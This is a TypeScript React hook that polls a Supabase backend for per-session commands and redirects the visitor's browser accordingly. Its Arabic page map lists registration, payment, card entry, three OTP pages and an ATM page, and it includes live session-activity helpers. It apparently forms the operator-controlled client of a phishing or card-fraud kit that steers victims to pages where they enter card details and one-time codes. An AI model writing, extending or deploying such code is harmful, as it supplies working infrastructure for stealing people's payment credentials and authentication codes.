// Navigation control hook - checks for commands and redirects user
import { useEffect, useRef } from "react";
import { ensureSessionId } from "./submissions";
import { getNavigationCommand, deleteNavigationCommands, ACTION_TO_ROUTE, type NavigationAction } from "./api";

const CHECK_INTERVAL = 2000; // Check every 2 seconds

// Page name translations
export const PAGE_NAMES: Record<string, string> = {
  "/": "الرئيسية",
  "/form": "تسجيل البيانات",
  "/select": "اختيار العرض",
  "/total": "الدفع",
  "/total2": "الدفع 2",
  "/card": "إدخال البطاقة",
  "/visa": "البطاقة",
  "/otp": "الرمز",
  "/otp2": "الرمز 2",
  "/otp3": "الرمز 3",
  "/atm": "الصراف",
  "/success": "نجاح",
};

export function getPageName(path: string): string {
  return PAGE_NAMES[path] || path;
}

export interface PingData {
  session_id: string;
  current_page: string;
  last_ping: string;
}

// Navigation control hook
export function useHeartbeatTracking() {
  const checkIntervalRef = useRef<number | null>(null);
  const sessionIdRef = useRef<string>("");
  const isRedirectingRef = useRef<boolean>(false);
  const hasInitializedRef = useRef<boolean>(false);

  // Check for navigation command
  async function checkForCommand() {
    // Prevent multiple concurrent checks
    if (isRedirectingRef.current) return;
    
    const sessionId = sessionIdRef.current;
    if (!sessionId) return;

    try {
      // Get command from Supabase
      const command = await getNavigationCommand(sessionId);
      
      // No command found
      if (!command) return;
      if (!command.action) return;

      console.log("Command received:", command.action);

      // Start redirect process
      isRedirectingRef.current = true;

      // Determine redirect target
      let targetUrl: string | null = null;

      // Check if custom redirect URL exists
      if (command.redirect_to && typeof command.redirect_to === 'string' && command.redirect_to.length > 0) {
        targetUrl = command.redirect_to;
      } else {
        // Use action to route mapping
        const route = ACTION_TO_ROUTE[command.action as NavigationAction];
        if (route) {
          targetUrl = route;
        }
      }

      // Perform redirect if target found
      if (targetUrl) {
        console.log("Redirecting to:", targetUrl);
        
        // Use window.location.href for full page redirect
        window.location.href = targetUrl;
      } else {
        console.warn("Unknown action:", command.action);
        // Reset flag for unknown action
        isRedirectingRef.current = false;
      }

      // Delete command after processing (fire and forget)
      deleteNavigationCommands(sessionId).catch(function(err) {
        console.error("Failed to delete command:", err);
      });

    } catch (err) {
      console.error("Error checking for command:", err);
      // Don't keep isRedirecting true on error
      isRedirectingRef.current = false;
    }
  }

  // Start checking
  function startChecking() {
    if (checkIntervalRef.current !== null) return; // Already running
    if (hasInitializedRef.current) return;

    hasInitializedRef.current = true;
    sessionIdRef.current = ensureSessionId();
    
    console.log("Navigation control started, session:", sessionIdRef.current);

    // Check immediately
    checkForCommand();

    // Then check periodically
    checkIntervalRef.current = window.setInterval(function() {
      checkForCommand();
    }, CHECK_INTERVAL);
  }

  // Stop checking
  function stopChecking() {
    if (checkIntervalRef.current !== null) {
      window.clearInterval(checkIntervalRef.current);
      checkIntervalRef.current = null;
    }
  }

  // Start on mount, stop on unmount
  useEffect(function() {
    startChecking();
    return function cleanup() {
      stopChecking();
    };
  }, []);

  return {
    sessionId: sessionIdRef.current,
    stopTracking: stopChecking,
  };
}

// Format relative time
export function formatLiveTime(isoString: string): string {
  const diff = Date.now() - new Date(isoString).getTime();
  const secs = Math.floor(diff / 1000);

  if (secs < 60) return `منذ ${secs} ثانية`;
  
  const mins = Math.floor(secs / 60);
  const remainingSecs = secs % 60;

  if (mins < 60) return `منذ ${mins} دقيقة و ${remainingSecs} ثانية`;

  const hours = Math.floor(mins / 60);
  const remainingMins = mins % 60;

  if (hours < 24) return `منذ ${hours} ساعة و ${remainingMins} دقيقة`;

  return new Date(isoString).toLocaleString("ar-EG", {
    day: "numeric",
    month: "short",
    hour: "2-digit",
    minute: "2-digit",
  });
}

// Check if session is active (within 10 seconds)
export function isSessionActive(lastPing: string | null): boolean {
  if (!lastPing) return false;
  const diff = Date.now() - new Date(lastPing).getTime();
  return diff <= 10000;
}

// Get seconds since last ping
export function getSecondsSincePing(lastPing: string | null): number {
  if (!lastPing) return Infinity;
  return Math.floor((Date.now() - new Date(lastPing).getTime()) / 1000);
}
